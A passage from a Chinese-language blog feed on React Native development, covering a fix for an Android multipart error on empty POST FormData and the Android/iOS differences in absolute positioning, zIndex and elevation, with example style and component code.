class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果POST请求无需传参 此时FormData如下：</p><blockquote><p>FormData {_parts: Array(0)}</p></blockquote><p>Android底层会报错，错误如下：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token number">11.440</span> <span class="token number">4738</span><span class="token operator">-</span><span class="token number">5202</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>IllegalStateException<span class="token punctuation">:</span> Multipart body must have at least one part<span class="token punctuation">.</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token number">11.441</span> <span class="token number">4738</span><span class="token operator">-</span><span class="token number">5202</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at okhttp3<span class="token punctuation">.</span>MultipartBody$Builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>MultipartBody<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">335</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token number">11.441</span> <span class="token number">4738</span><span class="token operator">-</span><span class="token number">5202</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at com<span class="token punctuation">.</span>facebook<span class="token punctuation">.</span>react<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>network<span class="token punctuation">.</span>NetworkingModule<span class="token punctuation">.</span><span class="token function">sendRequest</span><span class="token punctuation">(</span>NetworkingModule<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">414</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token number">11.441</span> <span class="token number">4738</span><span class="token operator">-</span><span class="token number">5202</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token number">11.441</span> <span class="token number">4738</span><span class="token operator">-</span><span class="token number">5202</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at com<span class="token punctuation">.</span>facebook<span class="token punctuation">.</span>react<span class="token punctuation">.</span>bridge<span class="token punctuation">.</span>JavaMethodWrapper<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>JavaMethodWrapper<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">374</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token number">11.441</span> <span class="token number">4738</span><span class="token operator">-</span><span class="token number">5202</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at com<span class="token punctuation">.</span>facebook<span class="token punctuation">.</span>react<span class="token punctuation">.</span>bridge<span class="token punctuation">.</span>JavaModuleWrapper<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>JavaModuleWrapper<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">162</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token number">11.441</span> <span class="token number">4738</span><span class="token operator">-</span><span class="token number">5202</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at com<span class="token punctuation">.</span>facebook<span class="token punctuation">.</span>react<span class="token punctuation">.</span>bridge<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>NativeRunnable<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token number">11.441</span> <span class="token number">4738</span><span class="token operator">-</span><span class="token number">5202</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at android<span class="token punctuation">.</span>os<span class="token punctuation">.</span>Handler<span class="token punctuation">.</span><span class="token function">handleCallback</span><span class="token punctuation">(</span>Handler<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">743</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token number">11.441</span> <span class="token number">4738</span><span class="token operator">-</span><span class="token number">5202</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at android<span class="token punctuation">.</span>os<span class="token punctuation">.</span>Handler<span class="token punctuation">.</span><span class="token function">dispatchMessage</span><span class="token punctuation">(</span>Handler<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token number">11.441</span> <span class="token number">4738</span><span class="token operator">-</span><span class="token number">5202</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at com<span class="token punctuation">.</span>facebook<span class="token punctuation">.</span>react<span class="token punctuation">.</span>bridge<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>MessageQueueThreadHandler<span class="token punctuation">.</span><span class="token function">dispatchMessage</span><span class="token punctuation">(</span>MessageQueueThreadHandler<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token number">11.441</span> <span class="token number">4738</span><span class="token operator">-</span><span class="token number">5202</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at android<span class="token punctuation">.</span>os<span class="token punctuation">.</span>Looper<span class="token punctuation">.</span><span class="token function">loop</span><span class="token punctuation">(</span>Looper<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token number">11.441</span> <span class="token number">4738</span><span class="token operator">-</span><span class="token number">5202</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at com<span class="token punctuation">.</span>facebook<span class="token punctuation">.</span>react<span class="token punctuation">.</span>bridge<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>MessageQueueThreadImpl$<span class="token number">3</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>MessageQueueThreadImpl<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">194</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token number">11.441</span> <span class="token number">4738</span><span class="token operator">-</span><span class="token number">5202</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">833</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>处理方式：</p><blockquote><p>前端兼容POST参数，如果POST请求无需传参 也就是params为空时，前端拼接一个空的part，part的key、value值都zhiwei空</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>WBCST<span class="token punctuation">.</span><span class="token function">isEmptyOfObject</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> params<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上的兼容都在rn-app中封装网络请求时处理过了，如果不调用rn-app中的网络请求的话，需要自己注意以上的坑；建议大家使用时都调用封装处理好的网络请求：</p><p>GET请求：WBCST.getFetch</p><p>POST请求：WBCST.postFetch</p><p>具体使用详见 <a href="https://blog.csdn.net/gongch0604/article/details/84630587" target="_blank" rel="noopener">网络请求模块</a></p>]]></content>
      
      
      <categories>
          
          <category> fetch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fetch </tag>
            
            <tag> ReactNative </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RN中Android定位问题</title>
      <link href="2018/11/10/rnAndroidPosition/"/>
      <url>2018/11/10/rnAndroidPosition/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在RN开发中仅仅使用flex布局，也满足不了我们日常的需求开发；RN官方也提供了定位布局，flexbox定位和position定位可以同时使用，同时生效；</p><h2 id="position"><a href="#position" class="headerlink" title="position"></a>position</h2><p>RN提供了两种布局方式：absolute和relative</p><ul><li>relative<ul><li>相对于 上一个兄弟节点</li><li>不可以浮动(尽管偏移了,还是占了一个位置)</li></ul></li><li>absolute<ul><li>相对于 父视图</li><li>浮动的</li></ul></li></ul><p>绝对布局是脱离文档流的，不过RN依旧在文档层次结构里面，这个和html的position也很大不一样。另外还有一个和html不一样的是，html中<code>position:absolute</code>要求父容器的position必须是absolute或者relative，如果第一层父容器position不是absolute或者relative，在html会依次向上递归查询直到找到为止，然后居于找到的父容器绝对定位。</p><p>如果你之前是搞安卓开发的会觉得RN设计非常怪异，在我们安卓原生开发中，决定用什么布局的是由parent决定的，如：AbsoluteLayout和RelativeLayout,而在RN开发中，决定用什么布局的是有child来决定的。</p><p>比如:</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>View<span class="token operator">></span><span class="token operator">&lt;</span>Text style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>position<span class="token punctuation">:</span><span class="token string">'absolute'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样Text组件相对于外层parent组件是相对布局，同理我们可以修改成relative。</p><p>可以使用left、top、right、bottom来改变偏移量。如下图：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/position.jpeg" alt></p><pre class="line-numbers language-js"><code class="language-js">absolute：       view1的样式<span class="token punctuation">:</span>  <span class="token punctuation">{</span> position<span class="token punctuation">:</span><span class="token string">'absolute'</span><span class="token punctuation">,</span>left<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">,</span>top<span class="token punctuation">:</span><span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">.</span>       view2的样式<span class="token punctuation">:</span>  <span class="token punctuation">{</span> position<span class="token punctuation">:</span><span class="token string">'absolute'</span><span class="token punctuation">,</span>right<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">,</span>bottom<span class="token punctuation">:</span><span class="token number">10</span> <span class="token punctuation">}</span><span class="token punctuation">.</span>  relative<span class="token punctuation">:</span>      view1的样式<span class="token punctuation">:</span>  <span class="token punctuation">{</span> position<span class="token punctuation">:</span><span class="token string">'relative'</span><span class="token punctuation">,</span>left<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">,</span>top<span class="token punctuation">:</span><span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">.</span>      view2的样式<span class="token punctuation">:</span>  <span class="token punctuation">{</span> position<span class="token punctuation">:</span><span class="token string">'relative'</span><span class="token punctuation">,</span>left<span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">,</span>top<span class="token punctuation">:</span><span class="token number">30</span> <span class="token punctuation">}</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="zIndex层级"><a href="#zIndex层级" class="headerlink" title="zIndex层级"></a>zIndex层级</h2><p>zIndex是rn在0.30开始支持的属性，是可以生效的；</p><p>一般是zIndex层级大的在上面</p><p>对于Android，两个同一层级的定位组件（position：”absolute”）</p><table><thead><tr><th>情况</th><th>在z轴的层叠关系</th></tr></thead><tbody><tr><td>既没有ZIndex属性，又没有elevation 属性</td><td>由其摆放位置决定的，放在下面的组件会在上层</td></tr><tr><td>两个组件只有zIndex没有elevation属性时</td><td>zIndex大的在上层</td></tr><tr><td>两个组件有elevation属性</td><td>elevation大的在上层</td></tr><tr><td>两个组件既有zIndex属性elevation属性</td><td>以elevation为准</td></tr></tbody></table><p>注：对于IOS，同层级的组件，z轴的层叠关系只与摆放顺序与zIndex有关，与elevation无关</p><h2 id="Android和iOS-position差异"><a href="#Android和iOS-position差异" class="headerlink" title="Android和iOS position差异"></a>Android和iOS position差异</h2><p>如果使用position:”absolute”想要把子元素浮出到父元素外面一部分，在html中的常规处理可以把偏移量top、left、right、bottom设置成负值即可；此种方案在RN的iOS端可是可行的，但是Android端浮出父元素外面的部分是不显示的；</p><p>RN对absolute的官方解释就是：<strong>以父元素的边框为基准</strong>进行偏移，也就是说只能在父元素包裹的范围内偏移；</p><p>一下是iOS和Android上的差异：</p><p>iOS<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/android.png" alt></p><!-- <img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/android.png" width="375"/> --><p>Android<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/android1.jpg" alt></p><!-- <img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/android1.jpg" width="375"/> --><p>如上图想要给其中的一个模块打上一个推荐位的标，实现代码如下：</p><pre class="line-numbers language-js"><code class="language-js">priceGroup<span class="token punctuation">:</span> <span class="token punctuation">{</span>    paddingHorizontal<span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span>    flexDirection<span class="token punctuation">:</span> <span class="token string">"row"</span><span class="token punctuation">,</span>    justifyContent<span class="token punctuation">:</span> <span class="token string">"space-between"</span><span class="token punctuation">,</span>    alignItems<span class="token punctuation">:</span> <span class="token string">"center"</span><span class="token punctuation">,</span>    marginTop<span class="token punctuation">:</span> <span class="token number">25</span><span class="token punctuation">,</span>    position<span class="token punctuation">:</span> <span class="token string">"relative"</span><span class="token punctuation">,</span>    zIndex<span class="token punctuation">:</span> <span class="token number">99998</span><span class="token punctuation">,</span>    elevation<span class="token punctuation">:</span> <span class="token number">99998</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//父级容器</span>commotView<span class="token punctuation">:</span> <span class="token punctuation">{</span>    width<span class="token punctuation">:</span> <span class="token number">109</span><span class="token punctuation">,</span>    height<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span>    justifyContent<span class="token punctuation">:</span> <span class="token string">"center"</span><span class="token punctuation">,</span>    alignItems<span class="token punctuation">:</span> <span class="token string">"center"</span><span class="token punctuation">,</span>    borderWidth<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//推荐logo</span>recIcon<span class="token punctuation">:</span> <span class="token punctuation">{</span>    width<span class="token punctuation">:</span> <span class="token number">38</span><span class="token punctuation">,</span>    height<span class="token punctuation">:</span> <span class="token number">24</span><span class="token punctuation">,</span>    position<span class="token punctuation">:</span> <span class="token string">"absolute"</span><span class="token punctuation">,</span>    top<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">,</span>    right<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span>    justifyContent<span class="token punctuation">:</span> <span class="token string">"center"</span><span class="token punctuation">,</span>    alignItems<span class="token punctuation">:</span> <span class="token string">"center"</span><span class="token punctuation">,</span>    zIndex<span class="token punctuation">:</span> <span class="token number">99999</span><span class="token punctuation">,</span>    elevation<span class="token punctuation">:</span> <span class="token number">99999</span><span class="token punctuation">}</span><span class="token keyword">let</span> priceDom <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> index<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//价格列表数据对象 dealPrice折扣价 originPrice原价 desc标题</span>    <span class="token keyword">let</span> <span class="token punctuation">{</span> id<span class="token punctuation">,</span> dealPrice<span class="token punctuation">,</span> originPrice<span class="token punctuation">,</span> desc<span class="token punctuation">,</span> recommand <span class="token punctuation">}</span> <span class="token operator">=</span> item<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//是否选中</span>    <span class="token keyword">let</span> isChecked <span class="token operator">=</span> id <span class="token operator">==</span> sel<span class="token punctuation">.</span>id <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//是否使能 免费使用不选点击选择</span>    <span class="token keyword">let</span> dis <span class="token operator">=</span> discountStatus <span class="token operator">==</span> <span class="token string">"0"</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>        <span class="token operator">&lt;</span>TouchableOpacity            activeOpacity<span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span>            key<span class="token operator">=</span><span class="token punctuation">{</span>index<span class="token punctuation">}</span>            onPress<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>discountStatus<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pre<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                        <span class="token keyword">return</span> <span class="token punctuation">{</span>                            selected<span class="token punctuation">:</span> item                        <span class="token punctuation">}</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">}</span>            style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">[</span>                styles<span class="token punctuation">.</span>commotView<span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">//选中状态和非选中状态以及免费不能点击状态字体颜色区分</span>                isChecked                    <span class="token operator">?</span> styles<span class="token punctuation">.</span>activePriceView                    <span class="token punctuation">:</span> dis                    <span class="token operator">?</span> styles<span class="token punctuation">.</span>disableView                    <span class="token punctuation">:</span> styles<span class="token punctuation">.</span>priceView            <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token operator">></span>            <span class="token punctuation">{</span><span class="token comment" spellcheck="true">/* 折扣状态和全价状态下会显示推荐tag */</span><span class="token punctuation">}</span>            <span class="token punctuation">{</span>discountStatus <span class="token operator">&amp;&amp;</span> recommand <span class="token operator">?</span> <span class="token punctuation">(</span>                <span class="token operator">&lt;</span>Image                    source<span class="token operator">=</span><span class="token punctuation">{</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./../img/recommand.png"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>                    style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>recIcon<span class="token punctuation">}</span>                <span class="token operator">/</span><span class="token operator">></span>            <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">}</span>            <span class="token punctuation">{</span><span class="token comment" spellcheck="true">/* 订阅列表标题栏 */</span><span class="token punctuation">}</span>            <span class="token operator">&lt;</span>Text                style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>                    color<span class="token punctuation">:</span> isChecked                        <span class="token operator">?</span> COLOR<span class="token punctuation">.</span>ActivetilColor                        <span class="token punctuation">:</span> dis                        <span class="token operator">?</span> COLOR<span class="token punctuation">.</span>disColor                        <span class="token punctuation">:</span> COLOR<span class="token punctuation">.</span>priceColor<span class="token punctuation">,</span>                    fontSize<span class="token punctuation">:</span> <span class="token number">15</span>                <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">></span>                <span class="token punctuation">{</span>desc<span class="token punctuation">}</span>            <span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>            <span class="token punctuation">{</span><span class="token comment" spellcheck="true">/* 订阅列表当前价格 折扣状态显示折扣之后的价格            免费试用显示全价中间价贯穿线 全价直接展示原始价格 */</span><span class="token punctuation">}</span>            <span class="token operator">&lt;</span>Text                style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>                    color<span class="token punctuation">:</span> isChecked                        <span class="token operator">?</span> COLOR<span class="token punctuation">.</span>ActivetilColor                        <span class="token punctuation">:</span> dis                        <span class="token operator">?</span> COLOR<span class="token punctuation">.</span>disColor                        <span class="token punctuation">:</span> COLOR<span class="token punctuation">.</span>priceColor<span class="token punctuation">,</span>                    fontSize<span class="token punctuation">:</span> <span class="token number">18</span>                <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">></span>                ¥                <span class="token operator">&lt;</span>Text                    style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">[</span>                        <span class="token punctuation">{</span> fontSize<span class="token punctuation">:</span> <span class="token number">36</span><span class="token punctuation">,</span> fontWeight<span class="token punctuation">:</span> <span class="token string">"700"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>                        discountStatus <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token punctuation">:</span> styles<span class="token punctuation">.</span>lineThrough                    <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token operator">></span>                    <span class="token punctuation">{</span>discountStatus <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>dealPrice<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>originPrice<span class="token punctuation">)</span><span class="token punctuation">}</span>                <span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>            <span class="token punctuation">{</span><span class="token comment" spellcheck="true">/* 折扣状态下的原始价格展示 */</span><span class="token punctuation">}</span>            <span class="token punctuation">{</span>discountStatus <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token punctuation">(</span>                <span class="token operator">&lt;</span>Text                    style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">[</span>                        styles<span class="token punctuation">.</span>lineThrough<span class="token punctuation">,</span>                        isChecked <span class="token operator">?</span> styles<span class="token punctuation">.</span>activeDiscountText <span class="token punctuation">:</span> styles<span class="token punctuation">.</span>discountText                    <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token operator">></span>                    <span class="token punctuation">{</span><span class="token function">parseInt</span><span class="token punctuation">(</span>originPrice<span class="token punctuation">)</span><span class="token punctuation">}</span>元                <span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>            <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">}</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>TouchableOpacity<span class="token operator">></span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">&lt;</span>View style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>priceGroup<span class="token punctuation">}</span><span class="token operator">></span><span class="token punctuation">{</span>priceDom<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>整体思路如下：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/pianyi.jpg" alt></p><!-- <img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/pianyi.jpg" width="375"/> --><p>此种布局就是常规思路，把要logo作为一个子元素放在要打标的模块里面，作为一个子元素，然后使用定位达到UI设计效果；二父元素的尺寸又是严格按照UI要求的尺寸来固定大小了；此时超出父元素的部分在Android上就不会显示了；</p><h5 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h5><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/handleP.jpg" 